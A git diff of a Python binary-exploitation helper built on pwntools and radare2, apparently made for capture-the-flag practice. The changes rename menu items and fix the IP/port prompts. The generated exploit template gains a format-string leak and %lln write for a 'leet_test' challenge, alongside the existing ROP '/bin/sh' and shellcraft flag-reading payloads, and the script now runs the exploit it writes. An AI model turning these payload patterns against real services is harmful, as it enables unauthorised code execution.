@@ -20,6 +20,7 @@ import r2pipe
 import sqlite3
 import pyfiglet
 import linecache
+import webbrowser
 
 from termcolor import colored
 
@@ -249,21 +250,21 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) ACCUMULATOR  (11) START  ADDRESS (21) PUTS@PLT ADDRESS (31) Find   Gadgets (41) MSF PatternCreate (51) Hexcode Editor" + '\u2551',end=' ')
+   print('\u2551' + "(01) ACCUMULATOR  (11) START  ADDRESS (21) PUTS@PLT ADDRESS (31) ExtractGadgets (41) MSF PatternCreate (51) Hexcode Editor" + '\u2551',end=' ')
    if "main" in FUNC[13]:
       print(colored(FUNC[13],colour3), end=' ')
    else:
       print(colored(FUNC[13],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) GOTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecCompProgram" + '\u2551',end=' ')
+   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) GOTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecComp   Dump" + '\u2551',end=' ')
    if "main" in FUNC[14]:
       print(colored(FUNC[14],colour3), end=' ')
    else:
       print(colored(FUNC[14],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI ;    RET (33) Read  Sections (43) L-Trace Interface (53) MOD ShellCraft" + '\u2551',end=' ')
+   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI ;    RET (33) Read  Sections (43) L-Trace Interface (53) Use ShellCraft" + '\u2551',end=' ')
    if "main" in FUNC[15]:
       print(colored(FUNC[15],colour3), end=' ')
    else:
@@ -284,28 +285,28 @@ def options():
       print(colored(FUNC[17],colour6), end=' ')     
    print('\u2551')
    # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
-   print('\u2551' + "(06) DESTIN INDEX (16) MEMORY CONTENT (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56)               " + '\u2551',end=' ')
+   print('\u2551' + "(06) DESTIN INDEX (16) MEMORY CONTENT (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56) RESERVED      " + '\u2551',end=' ')
    if "main" in FUNC[18]:
       print(colored(FUNC[18],colour3), end=' ')
    else:
       print(colored(FUNC[18],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(07) STACKPOINTER (17)                (27) Examine  Program (37) Read Assembley (47) Adjust the OFFSET (57) Set I.P./Port " + '\u2551',end=' ')
+   print('\u2551' + "(07) STACKPOINTER (17)                (27) Examine  Program (37) Read Assembley (47) Adjust the OFFSET (57) Set IP &  Port" + '\u2551',end=' ')
    if "main" in FUNC[19]:
       print(colored(FUNC[19],colour3), end=' ')
    else:
       print(colored(FUNC[19],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(08) BASE POINTER (18)                (28) CheckSec Program (38) Read   Symbols (48) Dis-Assemble MAIN (58) Write Exploit " + '\u2551',end=' ')
+   print('\u2551' + "(08) BASE POINTER (18)                (28) CheckSec Program (38) Read   Symbols (48) Dis-Assemble MAIN (58) Exploit Binary" + '\u2551',end=' ')
    if "main" in FUNC[20]:
       print(colored(FUNC[20],colour3), end=' ')
    else:
       print(colored(FUNC[20],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(09) INST POINTER (19)                (29) G.D.B. Functions (39) Read Stab Data (49) Dis-Assemble FUNC (59) Run Exploit   " + '\u2551',end=' ')
+   print('\u2551' + "(09) INST POINTER (19)                (29) G.D.B. Functions (39) Read Stab Data (49) Dis-Assemble FUNC (59) Read OP Manual" + '\u2551',end=' ')
    if "main" in FUNC[21]:
       print(colored(FUNC[21],colour3), end=' ')
    else:
@@ -1462,7 +1463,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Create gadgets file.
+# Details : Menu option selected - Find gadgets.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1730,7 +1731,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - MSF patter finder.
+# Details : Menu option selected - MSF pattern finder.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1771,7 +1772,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Blank.
+# Details : Menu option selected - Adjust the offset value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1788,7 +1789,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Disassemble MAN.
+# Details : Menu option selected - Disassemble main.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1861,7 +1862,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - seccomp-tools dump file.
+# Details : Menu option selected - Seccomp-tools dump.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1879,7 +1880,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Blank.
+# Details : Menu option selected - Start shellcraft code generator.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1922,7 +1923,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Generate shell code.
+# Details : Menu option selected - Generate msfvenom shell code.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1964,16 +1965,16 @@ while True:
          print("[-] Filename not specified...")
       else:
          DATA[10] = input("[?] Please enter remote IP address : ")
-         DATA[10] = spacePadding(DATA[9], COL1)
+         DATA[10] = spacePadding(DATA[10], COL1)
          DATA[11] = input("[?] Please enter remote port number: ")
-         DATA[11] = spacePadding(DATA[10], COL1)
+         DATA[11] = spacePadding(DATA[11], COL1)
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Generate exploit code.
+# Details : Menu option selected - Generate and run exploit code.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1988,15 +1989,12 @@ while True:
          command("echo '#                    PYTHON SCRIPT FILE FOR BINARY EXPLOITATION                        ' >> " + localDir + "/exploit.py")
          command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                  ' >> " + localDir + "/exploit.py")
          command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-        
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER        
          command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          command("echo 'context.clear()' >> " + localDir + "/exploit.py")
          command("echo 'context.log_level = \"error\" #  also info or debug' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          if DATA[1][:3] == "elf":
             command("echo 'exe  = (\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
             command("echo 'elf  = context.binary = ELF(exe,checksec=False)' >> " + localDir + "/exploit.py")           
@@ -2006,8 +2004,7 @@ while True:
          else:
             command("echo '# elf  = elf(\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
             command("echo 'context.binary = \"./" + DATA[0].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          if DATA[1][:3] == "elf":
             command("echo '#context.os = \"linux\"' >> " + localDir + "/exploit.py")
          else:
@@ -2016,7 +2013,6 @@ while True:
          command("echo '#context.bits = \"" + BIT[:2] + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER         
-         
          if DATA[9][:1] == "0":
             command("echo 'ip = \"0\"' >> " + localDir + "/exploit.py")          
          else:
@@ -2025,14 +2021,12 @@ while True:
             command("echo 'port = 0' >> " + localDir + "/exploit.py")         
          else:
             command("echo 'port = " + DATA[11].rstrip(" ") + "' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-                  
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER                  
          command("echo 'if ip != \"0\":' >> " + localDir + "/exploit.py")
          command("echo '   s = remote(ip, port)' >> " + localDir + "/exploit.py")
          command("echo 'else:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + DATA[0].rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          if DATA[5][:2] == "64":
             command("echo 'rax_addr  = p64(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'rbx_addr  = p64(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
@@ -2058,8 +2052,7 @@ while True:
             command("echo 'puts_got  = p64(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'pop_rdi   = p64(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'libc_addr = p64(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") 
-         
+            command("echo '' >> " + localDir + "/exploit.py")          
          if DATA[5][:2] == "32":
             command("echo 'eax_addr  = p32(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'ebx_addr  = p32(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
@@ -2085,13 +2078,11 @@ while True:
             command("echo 'puts_got  = p32(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'pop_rdi   = p32(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
             command("echo 'libc_addr = p32(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py")                
-         
+            command("echo '' >> " + localDir + "/exploit.py")         
          if CSEC[9][:1] == " ":
             command("echo 'offset     = " + CSEC[6].rstrip(" ") + "' >> " + localDir + "/exploit.py")
          else:
-            command("echo 'offset     = " + CSEC[9].rstrip(" ") + "' >> " + localDir + "/exploit.py")                 
-         
+            command("echo 'offset     = " + CSEC[9].rstrip(" ") + "' >> " + localDir + "/exploit.py")         
          command("echo 'padding    = \"a\" * offset' >> " + localDir + "/exploit.py")
          command("echo 'terminater = \"\\\\n\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
@@ -2101,72 +2092,79 @@ while True:
          if DATA[0][:3] == "reg":
             command("echo 'payload = flat(padding,jumpto,terminater)' >> " + localDir + "/exploit.py")
             command("echo '# print(payload)' >> " + localDir + "/exploit.py")         
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER   
-         
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          if DATA[0][:6] == "jeeves":
             command("echo 'payload = flat(padding,overwrite,terminater)' >> "  + localDir + "/exploit.py")
             command("echo '# print(payload)' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER
-         
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          if DATA[0][:11] == "htb-console":
             command("echo 'payload = flat(padding,pop_rdi,memory,system,terminater)' >> "  + localDir + "/exploit.py")
             command("echo '# print(payload)' >> " + localDir + "/exploit.py") 
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER
- 
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER 
             command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendline(\"hof\")' >> " + localDir + "/exploit.py")
             command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
             command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendline(\"flag\")' >> " + localDir + "/exploit.py")
-            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")     
-            
+            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")                 
          if DATA[0][:10] == "blacksmith":
             command("echo 'shellcode  = asm(shellcraft.open(\"flag.txt\"))' >> "  + localDir + "/exploit.py")
             command("echo 'shellcode += asm(shellcraft.read(3, \"rsp\", 0x100)) # read to rsp' >> "  + localDir + "/exploit.py")
             command("echo 'shellcode += asm(shellcraft.write(1, \"rsp\", \"rax\"))  # write rsp  ' >> "  + localDir + "/exploit.py")
-
             command("echo '' >> " + localDir + "/exploit.py") # SPACER            		
             command("echo 's.sendlineafter(\">\", \"1\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendlineafter(\">\", \"2\")' >> " + localDir + "/exploit.py")           
             command("echo 's.sendlineafter(\">\", flat(shellcode))' >> " + localDir + "/exploit.py")
-
             command("echo '' >> " + localDir + "/exploit.py") # SPACER 
             command("echo 's.recv()' >> " + localDir + "/exploit.py")
             command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
             command("echo 'print(terminater, flag)' >> " + localDir + "/exploit.py")
             command("echo 'exit(1)' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER            
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER                          
+         if DATA[0][:9] == "leet_test":
+            command("echo '#for i in range(100):' >> " + localDir + "/exploit.py")
+            command("echo '#   try:' >> " + localDir + "/exploit.py")
+            command("echo '#      s.sendline(\"%{}$x\".format(i))' >> " + localDir + "/exploit.py")
+            command("echo '#      s.recvuntil(\"Hello,\")' >> " + localDir + "/exploit.py")
+            command("echo '#      result = s.recvline()' >> " + localDir + "/exploit.py")
+            command("echo '#      print(str(i) + \": \" + str(result))' >> " + localDir + "/exploit.py")
+            command("echo '#   except EOFError:' >> " + localDir + "/exploit.py")
+            command("echo '#      pass' >> " + localDir + "/exploit.py")
+            command("echo '# exit(1)' >> " + localDir + "/exploit.py")            
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER              
+            command("echo 's.sendline(\"%{}$p\".format(38))' >> " + localDir + "/exploit.py")
+            command("echo 's.recvuntil(\"Hello,\")' >> " + localDir + "/exploit.py")
+            command("echo 'leaked_addr = int(s.recvlineS().strip(), 16)' >> " + localDir + "/exploit.py")
+            command("echo 'info(\"leaked_addr = 0x%x (%d)\", leaked_addr, leaked_addr)' >> " + localDir + "/exploit.py")
+            command("echo 'random_num_addr = leaked_addr - 0x11f' >> " + localDir + "/exploit.py")
+            command("echo 'payload = flat([\"%12$lln\", \"%13$llnaa\", pack(0x404078), pack(random_num_addr)])' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER  
             
-# ADD YOUR BESPOKE PAYLOAD HERE
+# ADD YOUR BESPOKE PAYLOADS HERE
          
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
          command("echo 's.interactive()' >> " + localDir + "/exploit.py")
-         command("echo '# s.close()' >> " + localDir + "/exploit.py")
-         
+         command("echo '# s.close()' >> " + localDir + "/exploit.py")         
          print(colored("[*] Python exploit template sucessfully created...", colour3))
          catsFile(localDir + "/exploit.py")
+         os.chdir(localDir)
+         command("echo 'PWNED!!' > flag.txt")  
+         os.system("python3 exploit.py")
+         os.chdir("..")
       prompt()                       
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Blank.
+# Details : Menu option selected - View instruction manual.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '59':     
-      if DATA[0][:7].upper() == "UNKNOWN":
-         print("[-] Filename not specified...")
-      else:  
-         if DATA[2][:6] == "static":
-            print("[-] File is curently set to static analysis...")
-         else:
-            os.chdir(localDir)
-            command("echo 'PWNED!!' > flag.txt")  
-            os.system("python3 exploit.py")
-            os.chdir("..")
+   if selection == '59':
+      print(colored("[*] Starting web-browser...", colour3))
+      webbrowser.get("firefox").open("https://docs.pwntools.com/en/latest/", new=2)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2188,7 +2186,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : FULL STACK
-# Details : Menu option selected - Secret option
+# Details : Menu option selected - Display copyright 2021
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
